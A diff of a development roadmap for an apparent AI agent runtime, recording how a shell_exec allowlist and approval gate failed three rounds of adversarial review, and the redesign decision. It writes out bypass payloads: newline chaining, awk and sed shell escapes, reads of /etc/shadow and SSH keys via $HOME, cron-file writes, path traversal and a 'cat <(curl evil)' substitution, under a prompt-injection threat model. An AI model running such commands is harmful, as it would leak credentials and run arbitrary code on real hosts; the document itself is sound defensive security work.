@@ -462,7 +462,7 @@ Per-keyword exhaustive routing tests landed: `skill-router.test.js` 27 → 134 c
 
 **Slice 3b.1 amendment (2026-05-14).** PR #19's test passed against the in-process `registerForRequest` API but missed two integration gaps that only surfaced once the gate fired on the live runtime: (1) the gate emitted no log event when no on-demand skills routed, so generic messages produced zero tool-call.log entries — indistinguishable from "code never ran"; (2) the test never drove `Agent._processNonReflex`, so a regression at that integration point would not have been caught. Slice 3b.1 (PR #20) adds an unconditional `'on_demand_routing'` summary record per `registerForRequest` call (carries `routed_always_on_skills`, `routed_on_demand_skills`, `declared_tools`, `activated_by_skill`, `active_set_size`) plus a `'deregistration'` record per cleanup, and rewrites the test to drive `agent.process()` end-to-end with a stub router/executor that records the tool list visible to the LLM. `scripts/verify-coupling.js` is the reproducible live verification harness — its log excerpt is now the standard for any slice that claims behavioural change to the tool surface.
 
-**Slice 3c — `shell_exec` narrowing + hygiene.** ✓ COMPLETE 2026-05-15
+**Slice 3c — `shell_exec` narrowing + hygiene.** ✓ COMPLETE 2026-05-15 — *verified-then-amended* (see Slice 3c.1)
 
 `shell_exec` gate inverted from blocklist to allowlist. New
 `src/tools/shell-exec-allowlist.js` exports `checkAllowlist(command)`;
@@ -509,16 +509,188 @@ four cases (allowlisted forms, 8 non-allowlisted rejections,
 `tests/shell-exec-allowlist.test.js` (55 checks) wired into npm test;
 all existing tests still green.
 
-**Slice 3 family ✓ FULLY CLOSED 2026-05-15.** Slice 3a (registry
-refactor + dead surface removal, PR #18, 2026-05-14) ✓ COMPLETE.
-Slice 3b (skill-loading ↔ tool-registration coupling, PR #19,
-2026-05-14) ✓ COMPLETE. Slice 3b.1 (per-message coupling observability
-+ end-to-end test, PR #20, 2026-05-14) ✓ COMPLETE. Slice 3c
-(allowlist + name reconciliation, this PR, 2026-05-15) ✓ COMPLETE.
-Slice 4 (verification gates) begins next session.
+**Slice 3c.1 amendment (2026-05-15) — gate ordering.** PR #23's
+Slice 3c shipped the allowlist as the inner first-line check inside
+`shell-exec.js` and the test/harness pair exercised that function in
+isolation. Both passed. The live runtime failed: the `ToolExecutor`
+invokes `ApprovalGate.check()` *before* the tool function runs, and
+`shell_exec` is in `gatedTools` — step 3 of the gate caught every
+`shell_exec` call (including `pm2 list`) and gated for approval
+before the inner allowlist could speak. Live smoke test 2026-05-15
+17:00 Athens: "check pm2 status" produced a high-risk approval prompt
+for `shell_exec({"command":"pm2 list"})`. Slice 3c.1 (PR #TBD,
+2026-05-15) adds an early branch to `ApprovalGate.check()` that
+consults `checkAllowlist()` for `toolName === 'shell_exec'` and
+returns `requiresApproval:false` for any non-empty command — the
+inner allowlist in `shell-exec.js` remains the single source of truth
+for the `not_allowlisted` response shape, now functioning as a
+redundant second-line defence. New harness
+`scripts/verify-approval-gate-allowlist-ordering.js` exercises the
+LIVE `ToolExecutor → ApprovalGate.check() → ToolRegistry.executeTool()
+→ shell-exec.fn()` call path with real instances — 13 commands, 53
+assertions, including a notifier-fired-zero-times sanity check. New
+test `tests/approval-gate-allowlist-ordering.test.js` (36 checks)
+codifies the contract. Lesson: a verification harness that exercises
+the inner unit in isolation is not enough — for any slice that
+modifies a layered defence, the harness must drive the layer above
+the change. This is the second consecutive slice that shipped with
+isolated unit tests passing while runtime was broken (3b.1 was the
+first); Slice 4 (verification gates) becomes the next priority for
+structural mitigation.
 
-**Slice 4 — Verification gates (soft + hard).**
-`verification-reflexes.md` skill written and loaded. `runGates()` runtime function with five gates. Gate log in place.
+**Slice 3 family — closure revised again 2026-05-15 (round-3 adversarial review).**
+Slice 3a (registry refactor + dead surface removal, PR #18,
+2026-05-14) ✓ COMPLETE. Slice 3b (skill-loading ↔ tool-registration
+coupling, PR #19, 2026-05-14) ✓ COMPLETE. Slice 3b.1 (per-message
+coupling observability + end-to-end test, PR #20, 2026-05-14)
+✓ COMPLETE. Slice 3c (allowlist + name reconciliation, PR #23,
+2026-05-15) ✓ COMPLETE — verified-then-amended. **Slice 3c.1
+(PR #24, 2026-05-15) ships in REDUCED SCOPE: gate-ordering fix +
+newline regex + `shell_exec` feature-flag disable
+(`QCLAW_SHELL_EXEC_ENABLED=0` default).** Slice 3d (allowlist
+redesign) is **ACCELERATED ahead of Slice 4** — three adversarial-
+review rounds on 3c.1 found 4 CRITICAL bypasses across three
+independent failure modes, signalling that the
+allowlist-by-enumeration design is structurally indefensible and
+needs a structural replacement before further security slices land.
+
+**Slice 3c.1 post-review remediation — three rounds, four CRITICALs, halt-and-redirect (2026-05-15).**
+Before flipping PR #24 ready-for-review the change went through three
+consecutive adversarial-review rounds. Each round found a CRITICAL
+bypass from a class the previous round hadn't anticipated:
+
+- **Round 1 — newline chaining (CRITICAL).** With the gate-ordering
+  fix in place, `shell_exec({command: "pm2 list\necho pwned"})` was
+  allowlisted by `checkAllowlist()` (because `CHAIN_REJECT_PATTERNS`
+  caught `;`, `&&`, `||`, `&`, `$(`, backtick — but NOT `\n` or `\r`),
+  the early shell_exec branch in `ApprovalGate.check()` returned
+  `requiresApproval:false`, and `execAsync(command, {shell:'/bin/bash'})`
+  executed both lines as root with NO approval prompt. Pre-3c.1 the
+  `gatedTools: ['shell_exec']` step would have forced Telegram approval
+  for the full command body; Slice 3c.1 removed that backstop.
+  **Remediation (kept):** `{ name: 'newline', re: /[\r\n]/ }` added to
+  `CHAIN_REJECT_PATTERNS` plus 21-assertion regression test driving
+  the live executor sequence + harness C4 case-set
+  (allowlisted-verb-with-inner-DESTRUCTIVE).
+
+- **Round 2 — rich-verb body-content shell-escape (2 CRITICAL + 2 HIGH).**
+  `awk BEGIN{system("echo PWN")}` runs shell from inside awk's program
+  body (awk's `system()` builtin / `| "sh"` / `|&` coprocess — none
+  catchable by flag enumeration because the spawn lives in the quoted
+  program body). `sed -e "1e echo PWN" /tmp/x` runs shell per
+  pattern-matched line via GNU sed's `e` command. `sed "1r /etc/shadow"`
+  / `sed -e "w /etc/cron.d/evil"` read/write arbitrary files via sed's
+  internal file machinery, bypassing the shell-redirect DESTRUCTIVE
+  regex. `cat /tmp/x > /tmp/../etc/passwd` passes the DESTRUCTIVE
+  `>\s*\/(?!dev/null|tmp/)` regex (sees `> /tmp/` and exempts), then
+  bash resolves the path to `/etc/passwd` at exec time.
+  **Round-2 remediation (REVERTED in scope reduction):** drop awk + sed
+  from `SINGLE_VERBS`, add `..` to `CHAIN_REJECT_PATTERNS`, +57 harness
+  assertions in a new C5 case-set.
+
+- **Round 3 — unexpanded-string regex vs bash-expanded paths (2 CRITICAL + 2 HIGH).**
+  Round 2's remediation tightened against rich-verb body content but
+  didn't anticipate the third class: the allowlist regex operates on
+  the *unexpanded* command string while bash performs `$VAR`, `~/`,
+  `<(…)`, `>(…)` expansion before execution. Repros:
+  `sort --compress-program=touch /tmp/sort_pwn /tmp/big` (CRITICAL —
+  sort spawns an arbitrary program via `--compress-program=<bin>`;
+  not in `DISALLOWED_FLAGS`), `cat $HOME/.ssh/id_rsa` and
+  `cat $HOME/.quantumclaw/config.json` (CRITICAL — `DENY_PATTERNS`
+  matches the literal `/root/.ssh/` / `/root/.quantumclaw/.env`
+  prefixes; `$HOME` expands at bash exec time so the regex misses;
+  config.json returns `dashboard.authToken`, the canonical token),
+  `find /tmp -fls /etc/cron.d/evil` (HIGH — `find -fls` writes to an
+  arbitrary file; no entry in `DISALLOWED_FLAGS.find`), `cat <(curl evil)`
+  (HIGH — process substitution; `CHAIN_REJECT_PATTERNS` has no `<(`
+  or `>(` entry).
+
+**Decision (Tyson):**
+
+> Three consecutive adversarial review rounds, each finding a CRITICAL
+> from a different failure mode. The pattern indicates allowlist-by-
+> enumeration with regex-on-unexpanded-string is structurally
+> indefensible, not a sequence of fixable bugs. Patching round 3 buys
+> round 4, which will find something else.
+
+Halt tactical patching of 3c.1. Accelerate Slice 3d (allowlist
+redesign). Ship 3c.1 in reduced scope.
+
+**Reduced scope (PR #24 final):**
+
+- Gate-ordering fix (commit `26bbe79`) — KEPT, verified correct in round 1.
+- Newline regex (commit `99a8809`) — KEPT, verified load-bearing.
+- C4 harness + newline C2 (commit `2de6aff`) — KEPT.
+- Round-2 awk/sed drop + `..` regex + C5 harness (commit `a12d260`) —
+  **REVERTED** (commit `2389bc1`). Band-aids on a design we're replacing.
+- `QCLAW_SHELL_EXEC_ENABLED` feature flag (commit `9bbf30c`) — NEW.
+  Default `'0'` / disabled. With awk + sed back on the allowlist after
+  the revert, the runtime surface is **wider** than pre-3c.1; the flag
+  prevents shipping a known-exploitable build. When disabled, the
+  tool is registered as a soft-deny stub returning
+  `{ok:false, error:'shell_exec_disabled', reason:'...claude_code_dispatch...', command, exit_code:-1}`
+  without ever reaching `execAsync` or firing an approval prompt.
+- Role + lane + delegation routing (commit `91e5d30`) — NEW. Charlie's
+  identity-layer docs direct previously-`shell_exec` work to
+  `claude_code_dispatch` (Slice 5). Note: if Slice 5 hasn't shipped
+  yet, surface the gap to Tyson rather than route around the disable.
+
+**Adversarial review becomes mandatory pre-PR-ready for security-relevant slices.**
+Three rounds caught three CRITICAL classes that would have shipped to
+production without the pre-PR-ready adversarial step. Pattern: each
+round's remediation tightens against the *current* finding; the next
+round finds something from a class the remediation didn't anticipate.
+This is the empirical signal that allowlist-by-enumeration cannot
+keep pace with adversarial pressure — and the signal that adversarial
+review pre-PR is not a "nice to have" or per-PR judgement call, but a
+procedural step for any slice that modifies `ApprovalGate`,
+`shell-exec*`, `executor`, secrets handling, or tool registration /
+scope enforcement.
+
+**Slice 3d — Allowlist redesign — ACCELERATED ahead of Slice 4.**
+Three rounds of adversarial review on Slice 3c.1 surfaced 4 CRITICAL
+bypasses across three independent failure modes (newline chaining,
+rich-verb body-content shell-escape, regex-on-unexpanded-string vs
+bash-expanded paths). The empirical signal is that
+allowlist-by-enumeration cannot keep pace with adversarial pressure
+on a shell-string parsing model — the design needs structural
+replacement, not more rules. Slice 3d is **ACCELERATED ahead of
+Slice 4** because every future security-relevant slice that ships
+before 3d would inherit the same indefensible foundation. During the
+gap, `shell_exec` is disabled via `QCLAW_SHELL_EXEC_ENABLED=0`
+(Slice 3c.1 reduced scope, this PR); previously-`shell_exec` work
+routes through `claude_code_dispatch` (Slice 5). Tyson drafts the
+design brief separately; this entry reserves the slot with
+motivation and pointers to the three-round adversarial-review
+findings in `QCLAW_BUILD_LOG.md` (2026-05-15 entries).
+
+Design constraints for 3d (Tyson to refine):
+
+- Replace regex-on-shell-string with a structural model that operates
+  on parsed argv (e.g. `execFile`-style argv list, no `bash -c`, no
+  quoting, no chaining surface).
+- Bash expansions (`$VAR`, `~`, `<(…)`, `>(…)`, glob, alias) happen
+  before the model sees the command if invoked via `/bin/bash -c`,
+  so the model must run *after* expansion or replace `bash -c`
+  entirely.
+- Verb set should be narrow enough to audit by enumeration (e.g. ≤8
+  verbs total with no shell-spawn surface — `ls`, `cat`, `head`,
+  `tail`, `wc`, `pm2 list`, `git status` as candidates); rich verbs
+  (`grep -E`, `find`) need flag re-audit; awk/sed/sort go through
+  `claude_code_dispatch`.
+- Path arguments validated as absolute, normalized, and inside an
+  explicit allow-list of root prefixes — no `..`, no symlink escape
+  to outside-the-prefix.
+
+Triggered after PR #24 (Slice 3c.1 reduced) merges. Threat model:
+prompt-injection-driven `shell_exec` call construction. Reference:
+`QCLAW_BUILD_LOG.md` 2026-05-15 closure entry for the four-CRITICAL
+repro set.
+
+**Slice 4 — Verification gates (soft + hard).** Moved one slot back
+in the queue (was next after 3c.1; now next after 3d).
+`verification-reflexes.md` skill written and loaded. `runGates()`
+runtime function with five gates. Gate log in place.
 
 **Slice 5 — Claude Code delegation bridge.**
 Supabase table, `claude_code_dispatch` tool, PM2 dispatcher worker, result write-back, gate integration.
